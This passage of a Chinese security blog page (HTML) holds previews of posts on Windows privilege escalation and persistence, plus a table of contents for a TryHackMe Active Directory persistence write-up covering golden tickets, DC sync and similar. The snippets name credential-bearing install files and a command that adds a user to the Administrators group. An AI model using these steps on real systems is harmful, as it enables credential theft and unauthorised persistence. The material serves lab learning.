全局变量(Global Variables) 存储的变量   进程堆（Process Heap） 定义数据存储的堆   进程资源(Process Resources) 定义进程的更多资源   环境块（Environment...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="Windows权限提升"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows权限提升</div></div><div class="info-2"><div class="info-item-1">Windows权限提升常见获取密码方式无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置： 12345目录:\无人参与.xmlC:\Windows\Panther\Unattend.xmlC:\Windows\Panther\Unattend\Unattend.xml系统信息文件夹:\Windows\system32\sysprep.infC:\Windows\system32\sysprep\sysprep.xml  作为这些文件的一部分，您可能会遇到凭证： 12345&lt;Credentials&gt;    &lt;Username&gt;Administrator&lt;/Username&gt;    &lt;Domain&gt;thm.local&lt;/Domain&gt;   ...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="Windows权限维持"><img class="cover" src="/img/twjr.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows权限维持</div></div><div class="info-2"><div class="info-item-1">Windows权限维持篡改非特权账户分配组成员资格​	在这部分任务中，我们假设的前提是：攻击者已经转储了受害者机器的hash,并成功破解了所使用的非特权账户的密码 使得非特权用户能获得管理权限的最直接的方法就是:使其成为Administrators组的一部分 命令如下： 1net localgroup administrators thmuser0 /add   这将允许我们使用RDP、WinRM或者其他任何可用的远程管理服务，来访问服务器 为了降低可疑程度，可用Backup Operators组 此组中的用户将没有管理权限，但是可用读取、写入系统上的任何文件或注册表项，并且忽略任何已配置的DACL。这样我们就可以复制SAM和SYSTEM注册表配置单元的内容，然后恢复所有用户的密码hash，从而使得我们能升到Administrator 在此之前首先我们要将账户添加到Backup Operators组 1C:\&gt; net localgroup &quot;Backup Operators&quot; thmuser1...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">deCOLE</div><div class="author-info-description">凡夫俗子岂识我，非到末路不甘休</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">So when you go</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting-Active-Directory"><span class="toc-number">1.</span> <span class="toc-text">TryHackMe房间之Persisting Active Directory</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%87%AD%E6%8D%AE%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.</span> <span class="toc-text">通过凭据进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DC%E5%90%8C%E6%AD%A5"><span class="toc-number">2.1.</span> <span class="toc-text">DC同步</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Ticket%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">利用Ticket进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">白银票据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%81%E4%B9%A6%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">利用证书进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-number">4.1.</span> <span class="toc-text">窃取私钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6"><span class="toc-number">4.2.</span> <span class="toc-text">生成证书</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">5.</span> <span class="toc-text">利用SID历史记录进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0SID%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="toc-number">5.1.</span> <span class="toc-text">伪造SID历史记录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">通过组成员身份进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E7%BB%84"><span class="toc-number">6.1.</span> <span class="toc-text">嵌套组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">6.2.</span> <span class="toc-text">嵌套持久性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ACL%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.</span> <span class="toc-text">通过ACL进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87AD%E7%BB%84%E6%A8%A1%E6%9D%BF%E6%8C%81%E4%B9%85%E4%BF%9D%E5%AD%98"><span class="toc-number">7.1.</span> <span class="toc-text">通过AD组模板持久保存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-AdminSDHolder-%E8%BF%9B%E8%A1%8C%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">7.2.</span> <span class="toc-text">使用 AdminSDHolder 进行持久化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%8F%91%E5%B1%95%E6%94%BF%E7%AD%96"><span class="toc-number">7.3.</span> <span class="toc-text">可持续发展政策</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87GPO%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">8.</span> <span class="toc-text">通过GPO进行权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E8%8C%83%E5%9B%B4%E6%8C%81%E4%B9%85%E6%80%A7"><span class="toc-number">8.1.</span> <span class="toc-text">域范围持久性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GPO%E5%88%9B%E5%BB%BA"><span class="toc-number">8.2.</span> <span class="toc-text">GPO创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%9C%A8%E6%98%BE%E7%9C%BC%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">8.3.</span> <span class="toc-text">隐藏在显眼的地方</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/08/%E5%88%9D%E6%8E%A2%E5%85%8D%E6%9D%80%E5%B0%8F%E5%9F%BA%E7%A1%80/" title="初探免杀小基础">初探免杀小基础</a><time datetime="2025-07-07T16:00:00.000Z" title="发表于 2025-07-08 00:00:00">2025-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/" title="TryHackMe房间之Persisting Active Directory">TryHackMe房间之Persisting Active Directory</a><time datetime="2025-05-26T16:00:00.000Z" title="发表于 2025-05-27 00:00:00">2025-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BBilling/" title="TryHackMe房间之Billing">TryHackMe房间之Billing</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BReset/" title="TryHackMe房间之Reset">TryHackMe房间之Reset</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BEnterprise/" title="TryHackMe房间之Enterprise">TryHackMe房间之Enterprise</a><time datetime="2025-05-08T16:00:00.000Z" title="发表于 2025-05-09 00:00:00">2025-05-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By deCOLE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>